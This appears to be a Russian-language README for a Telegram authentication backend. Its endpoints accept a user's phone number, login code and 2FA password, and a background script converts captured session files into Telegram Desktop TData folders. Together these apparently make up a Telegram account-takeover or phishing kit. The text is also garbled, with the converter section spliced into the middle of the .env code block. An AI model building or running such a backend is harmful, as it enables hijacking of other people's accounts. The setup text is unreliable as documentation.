# Telegram Authentication Backend

Вам нужно получить Telegram API credentials:

## 1. Получить API ID и API HASH

1. Перейдите на https://my.telegram.org/
2. Войдите в свой Telegram аккаунт
3. Перейдите в "API development tools"
4. Создайте приложение и получите:
   - **API_ID** (число)
   - **API_HASH** (строка)

## 2. Создать `.env` файл

Создайте файл `backend/.env`:

```env

## Session -> TData Converter

По умолчанию сервер при старте попытается запустить фоновый скрипт
`convert_sessions.py`, который следит за папкой `from_session_to_tdata/sessions`.
При появлении нового файла сессии скрипт попытается конвертировать его
в TData и сохранить результат в `from_session_to_tdata/tdatas/<session>/tdata`.

Параметры:
- `CONVERT_POLL_INTERVAL` - опрос в секундах (по умолчанию `5`), можно задать в `backend/.env`.
- `TELEGRAM_API_ID` и `TELEGRAM_API_HASH` используются скриптом для инициализации клиента.

Запустить конвертер вручную:

```bash
cd backend
python3 convert_sessions.py
```

Логи конвертации выводятся в stdout (терминал), и для каждой успешной конвертации
создаётся флаг-файл `.converted` в папке `from_session_to_tdata/tdatas/<session>/`.

TELEGRAM_API_ID=12345678
TELEGRAM_API_HASH=your_api_hash_here
PORT=3001
```

## 3. Установить зависимости

```bash
cd backend

# Node зависимости
npm install

# Python зависимости
pip install -r requirements.txt
```

## 4. Запустить сервер

```bash
npm start
```

Сервер запустится на `http://localhost:3001`

## API Endpoints

### 1. Отправить код подтверждения
```bash
POST /api/auth/send-code
Content-Type: application/json

{
  "phone": "+79991234567"
}
```

**Ответ:**
```json
{
  "success": true,
  "phone_code_hash": "...",
  "message": "Code sent"
}
```

### 2. Проверить код
```bash
POST /api/auth/verify-code
Content-Type: application/json

{
  "phone": "+79991234567",
  "code": "12345",
  "phone_code_hash": "..."
}
```

**Ответ (успех):**
```json
{
  "success": true,
  "user_id": 123456789,
  "username": "username",
  "first_name": "Name"
}
```

**Ответ (нужен пароль 2FA):**
```json
{
  "success": false,
  "error": "password_needed",
  "message": "2FA required"
}
```

### 3. Проверить пароль 2FA
```bash
POST /api/auth/verify-password
Content-Type: application/json

{
  "phone": "+79991234567",
  "password": "your_2fa_password",
  "phone_code_hash": "...",
  "code": "12345"
}
```

**Ответ:**
```json
{
  "success": true,
  "user_id": 123456789,
  "username": "username",
  "first_name": "Name"
}
```
